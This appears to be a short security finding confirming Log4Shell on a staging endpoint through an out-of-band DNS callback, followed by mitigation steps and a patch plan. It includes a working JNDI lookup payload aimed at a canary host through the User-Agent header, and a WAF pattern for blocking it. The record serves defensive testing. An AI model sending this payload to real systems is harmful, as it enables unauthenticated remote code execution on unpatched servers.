g.text: Log4Shell confirmed via OOB DNS callback. Payload ${jndi:ldap://a3f7x12.burpmax-canary.test/log4shell}
injected into User-Agent header. DNS A query received at OOB server confirming JNDI evaluation.
Affects Log4j 2.0-beta9 through 2.14.1. Remote code execution without authentication.
OOB DNS hit: protocol=dns | q-type=A | unique-id=a3f7x12
Response: HTTP/1.1 200 OK (endpoint responded normally — blind execution)
Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true as an environment variable.
Block outbound LDAP/RMI at the network perimeter as defence-in-depth.
Apply WAF rules blocking ${jndi: pattern at the ingress layer.
Confirmed on staging 2026-05-21. OOB callback in 1.2s. PoC shared with dev team.
Patch scheduled for next sprint. 3 additional endpoints also affected.
